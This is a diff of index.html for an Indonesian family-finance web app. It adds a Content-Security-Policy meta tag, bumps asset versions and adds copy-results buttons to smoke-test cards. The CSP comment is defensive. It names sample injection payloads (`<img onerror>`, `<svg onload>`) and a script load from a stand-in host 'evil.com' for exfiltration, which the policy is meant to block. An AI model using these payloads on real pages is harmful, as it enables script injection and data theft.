@@ -2,10 +2,58 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
+<!--
+  Content-Security-Policy sebagai lapisan pertahanan KEDUA di luar disiplin
+  escapeHtml() -- kalau suatu saat ada satu titik render yang lolos dari
+  lint escapeHtml (lihat build.js: lintUnescapedUserField/-Concat), CSP ini
+  jadi jaring pengaman: browser akan MENOLAK menjalankan/memuat apa pun yang
+  tidak masuk allowlist di bawah, walau berhasil ke-inject ke DOM.
+
+  PENTING -- kejujuran soal batas proteksi CSP ini (bukan CSP "ideal"):
+  App ini masih banyak pakai inline event-handler attribute (onclick=,
+  onchange=, oninput=, dst -- 100+ titik di index.html) dan satu jalur
+  `new Function(...)` di features-helpers-global-security.js (fallback
+  data-onclick lama). Supaya CSP ini TIDAK langsung mematikan seluruh UI,
+  script-src di bawah terpaksa masih pakai 'unsafe-inline' & 'unsafe-eval'.
+  Konsekuensinya: CSP ini TIDAK memblokir payload injeksi gaya
+  `<img onerror="...">` atau `<svg onload="...">` yang nempel lewat celah
+  innerHTML/outerHTML yang lolos dari lint escapeHtml -- kode di payload
+  itu tetap akan jalan.
+  Yang TETAP terlindungi walau 'unsafe-inline'/'unsafe-eval' masih ada:
+    - Skrip/style dari domain asing yang TIDAK ada di allowlist connect-src/
+      script-src (mis. attacker coba muat <script src="https://evil.com/x.js">
+      atau exfiltrate data lewat fetch()/XHR ke domain asing) akan DITOLAK.
+    - object-src 'none' menutup vektor lewat <object>/<embed>/Flash-style plugin.
+    - base-uri 'self' & form-action 'self' mencegah base-tag hijacking &
+      form dialihkan ke domain asing.
+  Supaya proteksi ini bisa dinaikkan ke `script-src 'self'` penuh (tanpa
+  unsafe-inline/unsafe-eval), 100+ inline handler di atas perlu dimigrasi
+  dulu ke pola data-action (yang sudah dipakai sebagian besar tombol lain
+  di app ini, lewat delegated listener di features-helpers-global-security.js)
+  -- ini pekerjaan terpisah/lebih besar, belum dikerjakan di sini.
+
+  Domain yang di-allowlist & alasannya:
+    cdn.jsdelivr.net / cdnjs.cloudflare.com -> lazy-load eruda (debug console),
+      tesseract.js (OCR), jsPDF (cetak PDF) lewat _loadScriptOnce().
+    accounts.google.com -> Google Identity Services (login Google Drive/Sheets).
+    api.anthropic.com, generativelanguage.googleapis.com -> panggilan AI
+      (fitur AI Asisten, pakai API key milik user sendiri, disimpan lokal).
+    www.googleapis.com, sheets.googleapis.com -> integrasi Google Drive & Sheets.
+    data:/blob: di img-src & worker-src -> preview foto hasil scan (OCR),
+      unduhan file (URL.createObjectURL), dan service worker PWA yang
+      didaftarkan dari Blob (lihat setupPWA di features-sheets-pwa-selftest.js).
+
+  Catatan teknis: meta tag CSP tidak mendukung arahan frame-ancestors/
+  sandbox/report-uri (browser mengabaikannya kalau dikirim lewat meta,
+  cuma berlaku kalau dikirim lewat HTTP response header) -- kalau nanti app
+  ini dihosting di server sendiri, sebaiknya arahan ini juga dikirim lewat
+  header `Content-Security-Policy` di response, bukan cuma meta tag di sini.
+-->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://accounts.google.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://api.anthropic.com https://generativelanguage.googleapis.com https://www.googleapis.com https://sheets.googleapis.com https://accounts.google.com; frame-src https://accounts.google.com; worker-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; manifest-src 'self';">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <title>Keluarga W</title>
-<link rel="stylesheet" href="styles.css?v=95">
+<link rel="stylesheet" href="styles.css?v=106">
 <script>
 /* Debug console (Eruda) — aktifkan sekali lewat ?debug=1 di URL, nempel via localStorage.
    Matikan lagi lewat ?debug=0. Tidak aktif buat user biasa. */
@@ -57,8 +105,8 @@ b.appendChild(closeBtn);
 }catch(_e){ console.error('Gagal tampilkan banner error modul:',_e); }
 };
 </script>
-<script src="app-bundle-a.min.js?v=95" onerror="window.__moduleLoadFail('app-bundle-a.min.js')"></script>
-<script src="smoke-test.js?v=95" defer></script>
+<script src="app-bundle-a.min.js?v=106" onerror="window.__moduleLoadFail('app-bundle-a.min.js')"></script>
+<script src="smoke-test.js?v=106" defer></script>
 <link rel="manifest" id="pwaManifestLink" href="manifest.json">
 </head>
 <body data-theme="dark">
@@ -1462,9 +1510,12 @@ b.appendChild(closeBtn);
 
   <div class="card">
     <div class="card-title">🧭 Tes Navigasi Halaman <span class="card-collapse-toggle" id="diagNavTest-chev" data-action="toggleCardCollapse" data-args='["diagNavTest","$event"]' aria-label="Buka/tutup bagian">▾</span></div>
-    <button class="btn btn-primary btn-sm u-w100 u-mb4" data-action="runNavSmokeTest">▶️ Jalankan Tes Navigasi</button>
+    <div class="u-flex u-gap8 u-mb4">
+      <button class="btn btn-primary btn-sm u-flex1" data-action="runNavSmokeTest">▶️ Jalankan Tes Navigasi</button>
+      <button class="btn btn-ghost btn-sm u-flex1 u-dnone" id="navSmokeCopyBtn" data-action="copyNavSmokeResults">📋 Salin Hasil</button>
+    </div>
     <div class="card-collapse-body" id="diagNavTest-cbody">
-      <div class="u-hint12">Klik-otomatis semua halaman utama (Dashboard, Keuangan, Cobek, Catatan Kendaraan, AI, Pajak/Zakat, Pengaturan) satu per satu & cek ada error/exception atau tidak. Beda dari "Tes Otomatis" di atas -- ini ngecek NAVIGASI/RENDER halaman, bukan logika data. Aman dijalankan kapan saja, otomatis kembali ke halaman semula setelah selesai.</div>
+      <div class="u-hint12">Klik-otomatis semua halaman yang ada di aplikasi (otomatis ikut kalau ada halaman baru) satu per satu & cek ada error/exception atau tidak. Beda dari "Tes Otomatis" di atas -- ini ngecek NAVIGASI/RENDER halaman, bukan logika data. Aman dijalankan kapan saja, otomatis kembali ke halaman semula setelah selesai.</div>
       <div class="u-fs12 u-t2 u-mt10" id="navSmokeSummary"></div>
       <div class="u-mt6 result-list-scroll" id="navSmokeResults"></div>
     </div>
@@ -1478,7 +1529,10 @@ b.appendChild(closeBtn);
 
   <div class="card">
     <div class="card-title">🪟 Tes Buka/Tutup Modal <span class="card-collapse-toggle" id="diagModalTest-chev" data-action="toggleCardCollapse" data-args='["diagModalTest","$event"]' aria-label="Buka/tutup bagian">▾</span></div>
-    <button class="btn btn-primary btn-sm u-w100 u-mb4" data-action="runModalSweep">▶️ Jalankan Tes Modal</button>
+    <div class="u-flex u-gap8 u-mb4">
+      <button class="btn btn-primary btn-sm u-flex1" data-action="runModalSweep">▶️ Jalankan Tes Modal</button>
+      <button class="btn btn-ghost btn-sm u-flex1 u-dnone" id="modalSweepCopyBtn" data-action="copyModalSweepResults">📋 Salin Hasil</button>
+    </div>
     <div class="card-collapse-body" id="diagModalTest-cbody">
       <div class="u-hint12">Buka lalu tutup lagi semua form popup di aplikasi (tambah transaksi, tambah aset, dst) satu per satu, cek ada error atau tidak. Tidak pernah menekan tombol Simpan di dalamnya, jadi TIDAK menambah/mengubah data Anda — aman dijalankan kapan saja.</div>
       <div class="u-fs12 u-t2 u-mt10" id="modalSweepSummary"></div>
@@ -1959,6 +2013,6 @@ b.appendChild(closeBtn);
 
 <!-- MODAL: Budget Settings -->
 <script>document.write(MODAL_HTML[64]);</script><!-- modal:budgetSettingsModal externalized to modals.js -->
-<script src="app-bundle-b.min.js?v=95" onerror="window.__moduleLoadFail('app-bundle-b.min.js')"></script>
+<script src="app-bundle-b.min.js?v=106" onerror="window.__moduleLoadFail('app-bundle-b.min.js')"></script>
 </body>
 </html>
